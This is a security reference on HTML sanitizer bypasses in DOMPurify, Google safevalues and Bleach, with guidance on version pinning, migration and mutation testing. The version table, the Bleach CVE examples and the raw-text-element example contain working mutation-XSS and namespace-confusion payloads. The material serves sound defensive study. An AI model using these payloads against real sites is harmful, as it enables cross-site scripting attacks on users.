# HTML Sanitizer Bypass Techniques

## Overview

HTML sanitizers fail when there is a discrepancy between the parser the sanitizer uses internally and the browser's HTML parser. Sanitizers built on allowlists are more robust than blocklists, but still subject to namespace confusion, parser differential attacks, and implementation bugs. This document covers known bypass history for DOMPurify, Google's html-sanitizer, Bleach (Python), and general bypass principles.

---

## 1. Why Sanitizer Bypasses Happen

### Allowlist vs. Blocklist

Blocklist-based sanitizers enumerate dangerous tags and attributes. They fail whenever a new dangerous element or attribute is added to the HTML specification (e.g., new event handlers) or when the sanitizer's token parsing differs from the browser's.

Allowlist-based sanitizers (only permit known-safe elements/attributes) are more resilient but can still fail due to:

- **Parser differential attacks:** The sanitizer parses the string differently than the browser. The same byte sequence produces different DOM trees.
- **Namespace confusion:** HTML, SVG, and MathML namespaces have different element semantics. A sanitizer operating in the wrong namespace context may allow elements that execute in another.
- **Serialization/re-parse mismatch (mXSS):** The sanitizer produces a safe-looking string, but assigning that string to `innerHTML` causes the browser to re-parse it into an unsafe DOM. See [`techniques/03-mutation-xss.md`](../techniques/03-mutation-xss.md) for full coverage.

---

## 2. DOMPurify — Bypass History

DOMPurify is the most widely used client-side HTML sanitizer. Its bypass history is well-documented and informative for understanding the class of bugs.

| Version | Payload | Bypass Mechanism |
|---------|---------|-----------------|
| < 2.0.1 | `<svg><p><style><g title="</style><img src=x onerror=alert(1)>">` | SVG namespace: `<style>` is non-special in SVG, `</style>` mutates on re-parse to close a style element and expose the `<img>` |
| < 2.2.3 | `<noembed><img src="</noembed><img src=x onerror=alert(1)>">` | noembed mutation: embedded `</noembed>` in attribute value ends the element on re-parse |
| < 2.3.6 | `<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>` | Foster parenting + MathML namespace interaction causes `<img>` to escape sanitized subtree |
| < 3.0.0 | `<svg><use href="data:image/svg+xml,<svg id='x'><foreignObject><script>alert(1)</script></foreignObject></svg>#x">` | SVG `<use>` with external `href` fetched a data URI containing a `<script>` element; DOMPurify allowed it before blocking `href` on `<use>` |

### How to Stay Safe with DOMPurify

```javascript
// Pin to a specific version and update regularly
// Current stable: 3.x as of 2024
import DOMPurify from 'dompurify'; // ensure this resolves to >= 3.0

// Subscribe to DOMPurify security advisories:
// https://github.com/cure53/DOMPurify/security/advisories
```

Always check: [DOMPurify changelog](https://github.com/cure53/DOMPurify/blob/main/CHANGELOG.md) for security-relevant entries.

---

## 3. Google html-sanitizer

Google's `safevalues` library (formerly `html-sanitizer`) is used in Google's internal projects and exposed as `@google/safevalues`. It uses a strict allowlist and converts sanitized output to `SafeHtml` typed objects compatible with Trusted Types.

### Known Patterns

The library is generally robust. Historical issues have centered on:

- **`<math>` and `<svg>` handling:** Foreign content namespace issues in older versions. Verify that the version you're using allows or disallows SVG/MathML (default: blocked in strict mode).
- **Custom element allowlist misconfiguration:** If developers extend the allowlist to include `data-*` attributes without restricting values, they may inadvertently enable prototype pollution or framework injection.

```javascript
// Safe usage
import { sanitizeHtml } from '@google/safevalues';
const safe = sanitizeHtml(userInput);
element.innerHTML = safe.toString(); // TrustedHTML value
```

---

## 4. Bleach (Python)

[Bleach](https://github.com/mozilla/bleach) was Mozilla's HTML sanitization library for Python. **It was deprecated in 2023** and should not be used in new projects. The recommended replacement is `nh3` (Rust-backed) or `html-sanitizer`.

### Known Bypasses

**CVE-2018-7753** (Bleach < 2.1.3): An incorrect handling of `javascript:` protocol URLs with embedded whitespace allowed the protocol to bypass the URL sanitizer:

```python
# Bleach < 2.1.3 passed this as a valid URL:
bleach.clean('<a href="java\tscript:alert(1)">click</a>', tags=['a'], attributes={'a': ['href']})
# Output: <a href="java\tscript:alert(1)">click</a>  ← href not stripped
# Browsers strip the tab and execute javascript:alert(1)
```

**CVE-2020-6817** (Bleach < 3.1.1): ReDoS vulnerability — a crafted input caused catastrophic backtracking in the regex used for link parsing, causing denial of service. Not an XSS bypass, but a DoS risk.

**CVE-2021-23980** (Bleach < 3.3.0): A mutation XSS issue where `<noscript>` content was incorrectly parsed:

```python
# Bleach < 3.3.0
bleach.clean('<noscript><p title="</noscript><img src=x onerror=alert(1)>">', tags=['noscript','p'])
# Serialized output assigned to innerHTML could mutate to execute the onerror
```

### Migration from Bleach

```python
# Replace bleach with nh3 (Rust-backed, maintained)
pip install nh3

import nh3
clean = nh3.clean(user_input, tags={"b", "i", "a"}, attributes={"a": {"href"}})
```

---

## 5. General Sanitizer Bypass Principles

### Test Against the Actual Browser, Not the Sanitizer

The meaningful test is: after assigning `element.innerHTML = sanitized`, does the live DOM differ from what the sanitizer produced?

```javascript
function auditSanitizer(sanitizer, payload) {
  const sanitized = sanitizer(payload);
  const div = document.createElement('div');
  div.innerHTML = sanitized;
  if (sanitized !== div.innerHTML) {
    console.warn('[MUTATION]', { in: sanitized, out: div.innerHTML });
  }
}
```

### Test Foreign Content Namespaces

Always include SVG and MathML wrapping in your test payloads:

```
<svg><p><style>...</style>...</svg>
<math><mtext>...</mtext>...</math>
<svg><foreignObject>...</foreignObject></svg>
```

### Test Raw-Text Elements

`<script>`, `<style>`, `<textarea>`, `<title>`, `<noscript>`, `<noembed>`, `<plaintext>`, `<xmp>` — all have special parsing behavior. Content inside them is raw text, not markup. Injecting closing tags inside these elements can terminate them prematurely:

```html
<style><a title="</style><img src=x onerror=alert(1)>">
```

---

## References

- [DOMPurify Security Advisories](https://github.com/cure53/DOMPurify/security/advisories)
- [mXSS Attacks (Heyes & Roth)](https://cure53.de/fp170.pdf)
- [Bleach CVE-2018-7753](https://nvd.nist.gov/vuln/detail/CVE-2018-7753)
- [Bleach CVE-2021-23980](https://nvd.nist.gov/vuln/detail/CVE-2021-23980)
- [nh3 — Modern Python HTML sanitizer](https://github.com/messense/nh3)
- [WHATWG HTML Parsing — Foreign Content](https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-inforeign)
